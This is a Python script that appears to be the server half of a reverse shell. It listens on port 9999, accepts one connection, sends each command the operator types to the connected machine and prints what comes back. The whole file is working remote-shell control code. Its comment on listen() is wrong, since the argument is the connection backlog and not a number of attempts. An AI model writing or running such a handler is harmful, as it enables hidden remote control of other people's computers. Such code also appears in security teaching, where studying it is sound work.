#!/usr/bin/env python
import socket, sys

# Create a socket
def create_socket():

    global host, port, sock

    try:
        host = ""
        port = 9999
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as error_msg:
        print("[x] Unable to connect! | Error: {0}".format(error_msg))

# Binding host and port and listening for connections
def bind_socket():

    global host, port, sock
    try:
        print("Listening on port... {0}".format(port))
        sock.bind((host, port))
        sock.listen(5) # number specified the number of times it will attempt the connection
    except socket.error as error_msg:
        print("[x] Unable to bind socket/port combination | Error: {0}".format(error_msg))
        bind_socket()

# Establish connection with a client (socket must be listening)
def socket_accept():

    conn, addr = sock.accept()
    print("[*] Connection established! | {0}:{1}".format(addr[0], str(addr[1])))
    send_commands(conn) #persistence or while infinite while loop
    conn.close()

#sending commands to the client

def send_commands(conn):

    while True:
        cmd = input()
        if cmd == 'quit' or cmd == 'exit':
            conn.close()
            sock.close()
            sys.exit(0)
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

if __name__ == '__main__':

    create_socket()
    bind_socket()
    socket_accept()
        